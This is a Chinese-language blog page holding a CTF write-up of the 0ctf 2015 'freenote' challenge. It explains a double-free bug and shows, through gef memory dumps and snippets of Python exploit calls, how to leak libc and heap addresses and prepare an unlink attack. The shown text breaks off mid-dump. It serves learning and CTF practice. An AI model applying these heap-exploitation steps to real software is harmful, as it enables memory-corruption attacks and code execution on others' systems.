<!DOCTYPE html>
<html lang="en">
	<head>
		<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.11.1/tocbot.min.js"></script>
		<script src="https://cdn.staticfile.org/jquery/1.10.2/jquery.min.js"></script>
		<meta charset="utf-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
		
		<title>CTF | 0ctf 2015 freenote writeup - Yuuoniy&#39;s blog</title>
		
		<meta name="description" content="0ctf 2015 freenote writeup 涉及到 double free 漏洞，利用过程：leak libc ,leak heap, unlink
做题比写论文好玩多了呜呜呜呜 这个也是很经典的一道题啦，主要就是 leak libc ,leak heap, unlink 这三步
程序分析 首先弄一下结构体 大概就是这样吧：
00000000 chunk struc ; (sizeof=0x18, mappedto_8) 00000000 ; XREF: chunk_list/r 00000000 flag dq ? 00000008 size dq ? 00000010 ptr dq ? 00000018 chunk ends 00000018 00000000 ; --------------------------------------------------------------------------- 00000000 00000000 chunk_list struc ; (sizeof=0x1810, mappedto_9) 00000000 head dq ? 00000008 num dq ? 00000010 chunksptr chunk 256 dup(?">
		<meta name="author" content="">
		<meta name="generator" content="hugo-plains https://gitlab.com/hugo-plains/hugo-plains">
		
		<link href="https://yuuoniy.github.io/an-old-hope.min.css" rel="stylesheet">
		<link href="https://yuuoniy.github.io/style.css" rel="stylesheet">
		<link href="https://yuuoniy.github.io/custom.css" rel="stylesheet">
		
		<link rel="apple-touch-icon" href="https://yuuoniy.github.io/apple-touch-icon.png">
		<link rel="icon" href="https://yuuoniy.github.io/favicon.ico">
		
		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.11.1/tocbot.css">
		<meta name="generator" content="Hugo 0.76.5" />
		
		
		
		<script>
			function setTheme() {
				if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
					document.body.classList.add('dark');
					return;
				}
				
				let date = new Date();
				let time = date.getTime();
				let sunrise = date.setHours(7, 00); 
				let sunset = date.setHours(20, 00); 

				if (time < sunrise || time > sunset)
					document.body.classList.add('dark');
			}
			
		</script>
		
	</head>
	<body class="single">
		
		<script>
			setTheme();
			console.log("This site was made using Hugo and Plains. https://gohugo.io https://gitlab.com/hugo-plains/hugo-plains");
		</script>
		
		
		<header class="header">
			<nav class="nav">
				<p class="logo"><a href="https://yuuoniy.github.io/">Yuuoniy&#39;s blog</a></p>
				<ul class="menu">
					<li>
						<a href="/posts/">Posts</a>
					</li>
					<li>
						<a href="/tags/">Tags</a>
					</li>
					<li>
						<a href="/about/">About</a>
					</li>
					<li>
						<a href="/index.xml">RSS</a>
					</li>
				</ul>
			</nav>
		</header>
		<main class="main">


<article class="post-single">
	<header class="post-header">

		<h1 class="post-title">CTF | 0ctf 2015 freenote writeup</h1>
		<div class="post-meta">August 16, 2018</div>
		
		
	</header>
	<div class="toc"></div><div class="post-content"><p><code>0ctf 2015 freenote writeup</code>
涉及到 <code>double free</code> 漏洞，利用过程：<code>leak libc ,leak heap, unlink</code></p>
<!-- raw HTML omitted -->
<p>做题比写论文好玩多了呜呜呜呜
这个也是很经典的一道题啦，主要就是 <code>leak libc ,leak heap, unlink </code>这三步</p>
<h3 id="程序分析">程序分析</h3>
<p>首先弄一下结构体
大概就是这样吧：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ae81ff">00000000</span> chunk           struc ; (sizeof<span style="color:#f92672">=</span><span style="color:#ae81ff">0x18</span>, mappedto_8)
<span style="color:#ae81ff">00000000</span>                                         ; XREF: chunk_list<span style="color:#f92672">/</span>r
<span style="color:#ae81ff">00000000</span> flag            dq <span style="color:#960050;background-color:#1e0010">?</span>
<span style="color:#ae81ff">0000000</span><span style="color:#ae81ff">8</span> size            dq <span style="color:#960050;background-color:#1e0010">?</span>
<span style="color:#ae81ff">00000010</span> ptr             dq <span style="color:#960050;background-color:#1e0010">?</span>
<span style="color:#ae81ff">0000001</span><span style="color:#ae81ff">8</span> chunk           ends
<span style="color:#ae81ff">0000001</span><span style="color:#ae81ff">8</span>
<span style="color:#ae81ff">00000000</span> ; <span style="color:#f92672">---------------------------------------------------------------------------</span>
<span style="color:#ae81ff">00000000</span>
<span style="color:#ae81ff">00000000</span> chunk_list      struc ; (sizeof<span style="color:#f92672">=</span><span style="color:#ae81ff">0x1810</span>, mappedto_9)
<span style="color:#ae81ff">00000000</span> head            dq <span style="color:#960050;background-color:#1e0010">?</span>
<span style="color:#ae81ff">0000000</span><span style="color:#ae81ff">8</span> num             dq <span style="color:#960050;background-color:#1e0010">?</span>
<span style="color:#ae81ff">00000010</span> chunksptr       chunk <span style="color:#ae81ff">256</span> dup(<span style="color:#960050;background-color:#1e0010">?</span>)
<span style="color:#ae81ff">00001</span><span style="color:#ae81ff">810</span> chunk_list      ends
</code></pre></div><h4 id="initptr">initptr</h4>
<p>首先进行初始化，<code>malloc</code> 出 <code>0x1810</code> 大小的 <code>chunk</code> 用来管理堆块,我们把这个 <code>chunk</code> 命名为 <code>table</code>
结构大概是这样的:<br>
<code>ptr | chunknum | chunk[256]</code>
<code>chunk 的结构是这样： |flag|size|ptr|</code>
初始化把 <code>flag、size、ptr</code> 都置为 <code>0</code></p>
<h4 id="new">new</h4>
<p>size 大小最小是 <code>0x80</code>  再加个 <code>header</code> 就是 <code>0x90</code>
<code>(0x80 - size % 0x80) % 0x80 + size)</code></p>
<h4 id="edit">edit</h4>
<p>编辑堆块信息，如果 <code>size</code> 改变，会通过 <code>realloc</code> 新分配堆块</p>
<h4 id="delete">delete</h4>
<p>这里有个<code> double free</code> 漏洞</p>
<h4 id="list">list</h4>
<p>输出堆块信息</p>
<h3 id="利用思路">利用思路</h3>
<p>利用 <code>double free </code></p>
<h4 id="leak-libc">leak libc</h4>
<p><code>free</code> 掉 <code>0x90</code> 大小的堆块，会放入<code> unsorted bin</code> 中，添加 <code>fd,bk</code>信息。我们在 <code>malloc</code> 出来，仅修改低字节，因为 <code>libc</code> 中偏移不变，所以地址的低字节应该是不变的，<code>\x78</code> 是固定的。 泄露 <code>fd</code> 地址.. 计算得到 <code>libc</code> 基址</p>
<h4 id="leak-heap">leak heap</h4>
<p>使 <code>unsorted bin</code> 中 第一块的 bk 指向下一个 <code>free</code> 掉的 <code>chunk</code> ，泄露bk,得到 <code>heap</code> 地址</p>
<h4 id="unlink">unlink</h4>
<p><code>free</code> 一个堆块放入 <code>unsorted bin</code>，会检查后向合并，我们构造 <code>fake chunk</code>，伪造 <code>fd,bk</code>。从而达到 <code>ptr[0] = &amp;ptr[0]-0x18</code> 的效果</p>
<h3 id="利用过程">利用过程</h3>
<h4 id="泄露-libc-地址">泄露 libc 地址</h4>
<p>首先 <code>new</code> 两个 <code>0x80</code> 的 <code>chunk</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">gef<span style="color:#960050;background-color:#1e0010">➤</span>  x<span style="color:#f92672">/</span><span style="color:#ae81ff">16</span>gx <span style="color:#ae81ff">0x00000000019c3000</span>
<span style="color:#ae81ff">0x19c3000</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000001821</span>  <span style="color:#f92672">=&gt;</span> table header
<span style="color:#ae81ff">0x19c3010</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000100</span>	<span style="color:#ae81ff">0x0000000000000002</span> 
<span style="color:#ae81ff">0x19c3020</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000001</span>	<span style="color:#ae81ff">0x0000000000000080</span> <span style="color:#f92672">=&gt;</span> chunk <span style="color:#ae81ff">0</span> flag <span style="color:#f92672">|</span> size
<span style="color:#ae81ff">0x19c3030</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x00000000019c4830</span>	<span style="color:#ae81ff">0x0000000000000001</span> <span style="color:#f92672">=&gt;</span> chunk <span style="color:#ae81ff">0</span> ptr <span style="color:#f92672">|</span> chunk <span style="color:#ae81ff">1</span> flag
<span style="color:#ae81ff">0x19c3040</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000080</span>	<span style="color:#ae81ff">0x00000000019c48c0</span> <span style="color:#f92672">=&gt;</span> chunk <span style="color:#ae81ff">1</span> size <span style="color:#f92672">|</span> chunk <span style="color:#ae81ff">1</span> ptr
<span style="color:#ae81ff">0x19c3050</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
</code></pre></div><p>看一下这两个 <code>chunk</code> 的信息：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">gef<span style="color:#960050;background-color:#1e0010">➤</span>  x<span style="color:#f92672">/</span><span style="color:#ae81ff">32</span>gx <span style="color:#ae81ff">0x00000000019c4830</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x10</span>
<span style="color:#ae81ff">0x19c4820</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000091</span> <span style="color:#f92672">=&gt;</span> chunk <span style="color:#ae81ff">0</span> header
<span style="color:#ae81ff">0x19c4830</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x4141414141414141</span>	<span style="color:#ae81ff">0x4141414141414141</span>
......
<span style="color:#ae81ff">0x19c48b0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000091</span> <span style="color:#f92672">=&gt;</span> chunk <span style="color:#ae81ff">1</span> header
<span style="color:#ae81ff">0x19c48c0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x4242424242424242</span>	<span style="color:#ae81ff">0x4242424242424242</span>
...... 
<span style="color:#ae81ff">0x19c4910</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x4242424242424242</span>	<span style="color:#ae81ff">0x4242424242424242</span>
</code></pre></div><p><code>delete chunk 0</code> 写入 <code>fd, bk</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">gef<span style="color:#960050;background-color:#1e0010">➤</span>  x<span style="color:#f92672">/</span><span style="color:#ae81ff">16</span>gx <span style="color:#ae81ff">0x120d830</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x10</span>
<span style="color:#ae81ff">0x120d820</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000091</span> <span style="color:#f92672">=&gt;</span> chunk <span style="color:#ae81ff">0</span> header
<span style="color:#ae81ff">0x120d830</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x00007fd22ca79b78</span>	<span style="color:#ae81ff">0x00007fd22ca79b78</span> <span style="color:#f92672">=&gt;</span> fd <span style="color:#f92672">|</span> bk
<span style="color:#ae81ff">0x120d840</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x4141414141414141</span>	<span style="color:#ae81ff">0x4141414141414141</span>
<span style="color:#ae81ff">0x120d850</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x4141414141414141</span>	<span style="color:#ae81ff">0x4141414141414141</span>
</code></pre></div><p><code>new note('\x78')</code> 将刚刚 <code>free</code> 掉的<code> chunk 0</code> <code>malloc</code> 出来
可以看到<code>fd,bk</code>并没有修改，我们就可以通过 <code>list</code> 得到地址了</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">gef<span style="color:#960050;background-color:#1e0010">➤</span>  x<span style="color:#f92672">/</span><span style="color:#ae81ff">16</span>gx <span style="color:#ae81ff">0x1f66830</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x10</span>
<span style="color:#ae81ff">0x1f66820</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000091</span>
<span style="color:#ae81ff">0x1f66830</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x00007f307c0b5b78</span>	<span style="color:#ae81ff">0x00007f307c0b5b78</span> <span style="color:#f92672">=&gt;</span> fd <span style="color:#f92672">|</span> bk
<span style="color:#ae81ff">0x1f66840</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x4141414141414141</span>	<span style="color:#ae81ff">0x4141414141414141</span>
</code></pre></div><p>查看一下 <code>libc</code> 地址和 <code>fd</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">gef<span style="color:#960050;background-color:#1e0010">➤</span>  vmmap libc
Start              End                Offset             Perm Path
<span style="color:#ae81ff">0x00007fd22c6b5000</span> <span style="color:#ae81ff">0x00007fd22c875000</span> <span style="color:#ae81ff">0x0000000000000000</span> r<span style="color:#f92672">-</span>x <span style="color:#f92672">/</span>lib<span style="color:#f92672">/</span>x86_64<span style="color:#f92672">-</span>linux<span style="color:#f92672">-</span>gnu<span style="color:#f92672">/</span>libc<span style="color:#f92672">-</span><span style="color:#ae81ff">2.23</span>.so
.....
gef<span style="color:#960050;background-color:#1e0010">➤</span>  x<span style="color:#f92672">/</span><span style="color:#ae81ff">16</span>gx <span style="color:#ae81ff">0x00007fd22ca79b78</span>
<span style="color:#ae81ff">0x7fd22ca79b78</span> <span style="color:#f92672">&lt;</span>main_arena<span style="color:#f92672">+</span><span style="color:#ae81ff">88</span><span style="color:#f92672">&gt;:</span>	<span style="color:#ae81ff">0x000000000120d940</span>	<span style="color:#ae81ff">0x0000000000000000</span>
<span style="color:#ae81ff">0x7fd22ca79b88</span> <span style="color:#f92672">&lt;</span>main_arena<span style="color:#f92672">+</span><span style="color:#ae81ff">104</span><span style="color:#f92672">&gt;:</span>	<span style="color:#ae81ff">0x000000000120d820</span>	<span style="color:#ae81ff">0x000000000120d820</span>
</code></pre></div><p>我们可以计算 <code>hex(libc基址-fd)</code> 即 <code>hex(0x00007fd22ca79b78-0x00007fd22c6b5000)</code> 得到 <code>0x3c4b78</code>，当然这个值就是 <code>main_arena</code> 偏移 +<code>88</code></p>
<p>之后我们<code> delete chunk 1;delete chunk 0 ;</code>会和 <code>top chunk</code> 合并
此时堆布局,可以看到 <code>chunk 0</code> 和 <code>chunk 1 </code>的 <code>ptr</code> 还在</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">gef<span style="color:#960050;background-color:#1e0010">➤</span>  x<span style="color:#f92672">/</span><span style="color:#ae81ff">32</span>gx <span style="color:#ae81ff">0x000000000116b000</span>
<span style="color:#ae81ff">0x116b000</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000001821</span>
<span style="color:#ae81ff">0x116b010</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000100</span>	<span style="color:#ae81ff">0x0000000000000000</span>
<span style="color:#ae81ff">0x116b020</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
<span style="color:#ae81ff">0x116b030</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x000000000116c830</span>	<span style="color:#ae81ff">0x0000000000000000</span> <span style="color:#f92672">=&gt;</span> chunk <span style="color:#ae81ff">0</span> ptr
<span style="color:#ae81ff">0x116b040</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x000000000116c8c0</span> <span style="color:#f92672">=&gt;</span> chunk <span style="color:#ae81ff">1</span> ptr
<span style="color:#ae81ff">0x116b050</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span> 
<span style="color:#ae81ff">0x116b060</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
......
top chunk
</code></pre></div><h4 id="泄露-heap-地址">泄露 heap 地址</h4>
<p>泄露 <code>heap</code> 地址，是在 <code>unsorted bin</code> 中构造链，泄露 <code>unsorted bin</code> 中第一个 <code>chunk</code> 的<code>fd</code>,这时是指向下一个堆块的。泄露下一个堆块的地址，也就得到了 <code>heap</code> 地址。但是注意构造 <code>chunk</code> 时，要避免它们进行合并。</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">new_note(<span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span>notelen)<span style="color:#75715e">#0</span>
new_note(<span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span>notelen)
new_note(<span style="color:#e6db74">&#34;C&#34;</span><span style="color:#f92672">*</span>notelen)
new_note(<span style="color:#e6db74">&#34;D&#34;</span><span style="color:#f92672">*</span>notelen)
</code></pre></div><p>此时堆块信息</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">gef<span style="color:#960050;background-color:#1e0010">➤</span>  heap chunks
Chunk(addr<span style="color:#f92672">=</span><span style="color:#ae81ff">0x11e7010</span>, size<span style="color:#f92672">=</span><span style="color:#ae81ff">0x1820</span>, flags<span style="color:#f92672">=</span>PREV_INUSE)
    [<span style="color:#ae81ff">0x00000000011e7010</span>     <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">01</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">04</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>     <span style="color:#f92672">................</span>]
Chunk(addr<span style="color:#f92672">=</span><span style="color:#ae81ff">0x11e8830</span>, size<span style="color:#f92672">=</span><span style="color:#ae81ff">0x90</span>, flags<span style="color:#f92672">=</span>PREV_INUSE)
    [<span style="color:#ae81ff">0x00000000011e8830</span>     <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span>     AAAAAAAAAAAAAAAA]
Chunk(addr<span style="color:#f92672">=</span><span style="color:#ae81ff">0x11e88c0</span>, size<span style="color:#f92672">=</span><span style="color:#ae81ff">0x90</span>, flags<span style="color:#f92672">=</span>PREV_INUSE)
    [<span style="color:#ae81ff">0x00000000011e88c0</span>     <span style="color:#ae81ff">42</span> <span style="color:#ae81ff">42</span> <span style="color:#ae81ff">42</span> <span style="color:#ae81ff">42</span> <span style="color:#ae81ff">42</span> <span style="color:#ae81ff">42</span> <span style="color:#ae81ff">42</span> <span style="color:#ae81ff">42</span> <span style="color:#ae81ff">42</span> <span style="color:#ae81ff">42</span> <span style="color:#ae81ff">42</span> <span style="color:#ae81ff">42</span> <span style="color:#ae81ff">42</span> <span style="color:#ae81ff">42</span> <span style="color:#ae81ff">42</span> <span style="color:#ae81ff">42</span>     BBBBBBBBBBBBBBBB]
Chunk(addr<span style="color:#f92672">=</span><span style="color:#ae81ff">0x11e8950</span>, size<span style="color:#f92672">=</span><span style="color:#ae81ff">0x90</span>, flags<span style="color:#f92672">=</span>PREV_INUSE)
    [<span style="color:#ae81ff">0x00000000011e8950</span>     <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">43</span>     CCCCCCCCCCCCCCCC]
Chunk(addr<span style="color:#f92672">=</span><span style="color:#ae81ff">0x11e89e0</span>, size<span style="color:#f92672">=</span><span style="color:#ae81ff">0x90</span>, flags<span style="color:#f92672">=</span>PREV_INUSE)
    [<span style="color:#ae81ff">0x00000000011e89e0</span>     <span style="color:#ae81ff">44</span> <span style="color:#ae81ff">44</span> <span style="color:#ae81ff">44</span> <span style="color:#ae81ff">44</span> <span style="color:#ae81ff">44</span> <span style="color:#ae81ff">44</span> <span style="color:#ae81ff">44</span> <span style="color:#ae81ff">44</span> <span style="color:#ae81ff">44</span> <span style="color:#ae81ff">44</span> <span style="color:#ae81ff">44</span> <span style="color:#ae81ff">44</span> <span style="color:#ae81ff">44</span> <span style="color:#ae81ff">44</span> <span style="color:#ae81ff">44</span> <span style="color:#ae81ff">44</span>     DDDDDDDDDDDDDDDD]
Chunk(addr<span style="color:#f92672">=</span><span style="color:#ae81ff">0x11e8a70</span>, size<span style="color:#f92672">=</span><span style="color:#ae81ff">0x205a0</span>, flags<span style="color:#f92672">=</span>PREV_INUSE)  <span style="color:#960050;background-color:#1e0010">←</span>  top chunk
</code></pre></div><p>看一下 <code>table</code> 的记录：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">gef<span style="color:#960050;background-color:#1e0010">➤</span>  x<span style="color:#f92672">/</span><span style="color:#ae81ff">16</span>gx <span style="color:#ae81ff">0x11e7010</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x10</span>
<span style="color:#ae81ff">0x11e7000</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000001821</span> <span style="color:#f92672">=&gt;</span> table header
<span style="color:#ae81ff">0x11e7010</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000100</span>	<span style="color:#ae81ff">0x0000000000000004</span> <span style="color:#f92672">=&gt;</span> max <span style="color:#f92672">|</span> num
<span style="color:#ae81ff">0x11e7020</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000001</span>	<span style="color:#ae81ff">0x0000000000000080</span> 
<span style="color:#ae81ff">0x11e7030</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x00000000011e8830</span>	<span style="color:#ae81ff">0x0000000000000001</span> <span style="color:#f92672">=&gt;</span> chunk <span style="color:#ae81ff">0</span> ptr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000011e8830</span>
<span style="color:#ae81ff">0x11e7040</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000080</span>	<span style="color:#ae81ff">0x00000000011e88c0</span> <span style="color:#f92672">=&gt;</span> chunk <span style="color:#ae81ff">1</span> ptr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000011e88c0</span>
<span style="color:#ae81ff">0x11e7050</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000001</span>	<span style="color:#ae81ff">0x0000000000000080</span>
<span style="color:#ae81ff">0x11e7060</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x00000000011e8950</span>	<span style="color:#ae81ff">0x0000000000000001</span> <span style="color:#f92672">=&gt;</span> chunk <span style="color:#ae81ff">2</span> ptr
<span style="color:#ae81ff">0x11e7070</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000080</span>	<span style="color:#ae81ff">0x00000000011e89e0</span> <span style="color:#f92672">=&gt;</span> chunk <span style="color:#ae81ff">3</span> ptr
</code></pre></div><p>此时 bins 中是没有 chunk 的。
<code>chunk 1</code> 和<code>chunk 3</code>主要就是用来防止堆块合并的，这样我们才能在 unsorted bin 中成功构造链表</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">delete_note(<span style="color:#ae81ff">2</span>)
delete_note(<span style="color:#ae81ff">0</span>)
</code></pre></div><p>此时看一下 <code>unsorted bin</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">[<span style="color:#f92672">+</span>] unsorted_bins[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">:</span> fw<span style="color:#f92672">=</span><span style="color:#ae81ff">0x11e8820</span>, bk<span style="color:#f92672">=</span><span style="color:#ae81ff">0x11e8940</span>
 <span style="color:#960050;background-color:#1e0010">→</span>   Chunk(addr<span style="color:#f92672">=</span><span style="color:#ae81ff">0x11e8830</span>, size<span style="color:#f92672">=</span><span style="color:#ae81ff">0x90</span>, flags<span style="color:#f92672">=</span>PREV_INUSE)   <span style="color:#960050;background-color:#1e0010">→</span>   Chunk(addr<span style="color:#f92672">=</span><span style="color:#ae81ff">0x11e8950</span>, size<span style="color:#f92672">=</span><span style="color:#ae81ff">0x90</span>, flags<span style="color:#f92672">=</span>PREV_INUSE)
</code></pre></div><p>链表中：<code>unsorted bin | chunk 0 | chunk 2 </code>
大致是这样 <code>unsorted bin</code> 的 <code>fd</code> 指向下一个，也就是 <code>chunk 0</code>,<code>bk</code> 指向前一个，也就是 <code>chunk 2</code>
我们来看一下 <code>chunk 0</code> 和 <code>chunk 2</code> 的信息：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">gef<span style="color:#960050;background-color:#1e0010">➤</span>  x<span style="color:#f92672">/</span><span style="color:#ae81ff">16</span>gx <span style="color:#ae81ff">0x11e8830</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x10</span>
<span style="color:#ae81ff">0x11e8820</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000091</span>
<span style="color:#ae81ff">0x11e8830</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x00000000011e8940</span>	<span style="color:#ae81ff">0x00007f30b78c1b78</span> <span style="color:#f92672">=&gt;</span> chunk <span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">的</span> fd <span style="color:#960050;background-color:#1e0010">指向</span> chunk <span style="color:#ae81ff">2</span>,bk <span style="color:#960050;background-color:#1e0010">指向</span> unsorted Bin <span style="color:#960050;background-color:#1e0010">头。</span>
<span style="color:#ae81ff">0x11e8840</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x4141414141414141</span>	<span style="color:#ae81ff">0x4141414141414141</span>
<span style="color:#ae81ff">0x11e8850</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x4141414141414141</span>	<span style="color:#ae81ff">0x4141414141414141</span>
<span style="color:#ae81ff">0x11e8860</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x4141414141414141</span>	<span style="color:#ae81ff">0x4141414141414141</span>
gef<span style="color:#960050;background-color:#1e0010">➤</span>  x<span style="color:#f92672">/</span><span style="color:#ae81ff">16</span>gx <span style="color:#ae81ff">0x00000000011e8940</span>
<span style="color:#ae81ff">0x11e8940</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000091</span>
<span style="color:#ae81ff">0x11e8950</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x00007f30b78c1b78</span>	<span style="color:#ae81ff">0x00000000011e8820</span> <span style="color:#f92672">=&gt;</span> chunk <span style="color:#ae81ff">2</span> <span style="color:#960050;background-color:#1e0010">的</span> fd <span style="color:#960050;background-color:#1e0010">指向</span> unsorted bin <span style="color:#960050;background-color:#1e0010">头，</span>bk <span style="color:#960050;background-color:#1e0010">指向</span> chunk0. 
<span style="color:#ae81ff">0x11e8960</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x4343434343434343</span>	<span style="color:#ae81ff">0x4343434343434343</span>
<span style="color:#ae81ff">0x11e8970</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x4343434343434343</span>	<span style="color:#ae81ff">0x4343434343434343</span>

</code></pre></div><p>我们在 <code>malloc</code> 一下，就会将 <code>chunk 2</code> 分配出来，泄露 <code>chunk 2</code> 的 <code>bk</code> 就可以了。</p>
<p>可以来看一下：（在这里重新跑了一下脚本，chunk 的地址变了，不过不影响理解）
目前 <code>chunk</code> 的 <code>ptr</code> 如下&hellip;</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">gef<span style="color:#960050;background-color:#1e0010">➤</span>  x<span style="color:#f92672">/</span><span style="color:#ae81ff">16</span>gx <span style="color:#ae81ff">0x14d6010</span>
